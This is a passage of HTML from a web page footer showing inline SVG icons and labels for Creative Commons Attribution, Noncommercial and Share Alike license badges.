                    <symbol id=ai:fa6-brands:creative-commons-by>
                        <path d="M314.9 194.4v101.4h-28.3v120.5h-77.1V295.9h-28.3V194.4c0-4.4 1.6-8.2 4.6-11.3c3.1-3.1 6.9-4.7 11.3-4.7H299c4.1 0 7.8 1.6 11.1 4.7c3.1 3.2 4.8 6.9 4.8 11.3zm-101.5-63.7c0-23.3 11.5-35 34.5-35s34.5 11.7 34.5 35c0 23-11.5 34.5-34.5 34.5s-34.5-11.5-34.5-34.5zM247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-by></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Attribute</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-nc height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Noncommercial</title>
                    <symbol id=ai:fa6-brands:creative-commons-nc>
                        <path d="M247.6 8C387.4 8 496 115.9 496 256c0 147.2-118.5 248-248.4 248C113.1 504 0 393.2 0 256C0 123.1 104.7 8 247.6 8zM55.8 189.1c-7.4 20.4-11.1 42.7-11.1 66.9c0 110.9 92.1 202.4 203.7 202.4c122.4 0 177.2-101.8 178.5-104.1l-93.4-41.6c-7.7 37.1-41.2 53-68.2 55.4v38.1h-28.8V368c-27.5-.3-52.6-10.2-75.3-29.7l34.1-34.5c31.7 29.4 86.4 31.8 86.4-2.2c0-6.2-2.2-11.2-6.6-15.1c-14.2-6-1.8-.1-219.3-97.4zM248.4 52.3c-38.4 0-112.4 8.7-170.5 93l94.8 42.5c10-31.3 40.4-42.9 63.8-44.3v-38.1h28.8v38.1c22.7 1.2 43.4 8.9 62 23L295 199.7c-42.7-29.9-83.5-8-70 11.1c53.4 24.1 43.8 19.8 93 41.6l127.1 56.7c4.1-17.4 6.2-35.1 6.2-53.1c0-57-19.8-105-59.3-143.9c-39.3-39.9-87.2-59.8-143.6-59.8z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-nc></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Noncommercial</p>
                </div>
            </span>
            <span class=entry data-astro-cid-p3givckg>
                <svg class=heading data-astro-cid-p3givckg data-icon=fa6-brands:creative-commons-sa height=1em viewBox="0 0 496 512" width=0.97em>
                    <title>Share Alike</title>
                    <symbol id=ai:fa6-brands:creative-commons-sa>
                        <path d="M247.6 8C389.4 8 496 118.1 496 256c0 147.1-118.5 248-248.4 248C113.6 504 0 394.5 0 256C0 123.1 104.7 8 247.6 8zm.8 44.7C130.2 52.7 44.7 150.6 44.7 256c0 109.8 91.2 202.8 203.7 202.8c103.2 0 202.8-81.1 202.8-202.8c.1-113.8-90.2-203.3-202.8-203.3zM137.7 221c13-83.9 80.5-95.7 108.9-95.7c99.8 0 127.5 82.5 127.5 134.2c0 63.6-41 132.9-128.9 132.9c-38.9 0-99.1-20-109.4-97h62.5c1.5 30.1 19.6 45.2 54.5 45.2c23.3 0 58-18.2 58-82.8c0-82.5-49.1-80.6-56.7-80.6c-33.1 0-51.7 14.6-55.8 43.8h18.2l-49.2 49.2l-49-49.2h19.4z" fill=currentColor/>
                    </symbol>
                    <use xlink:href=#ai:fa6-brands:creative-commons-sa></use>
                </svg>
                <div class="content right" data-astro-cid-p3givckg>
                    <p data-astro-cid-p3givckg>Share Alike</p>
                </div>
            </span>
        </a>
    </div>
</footer>
</footer>
</body>
</html>
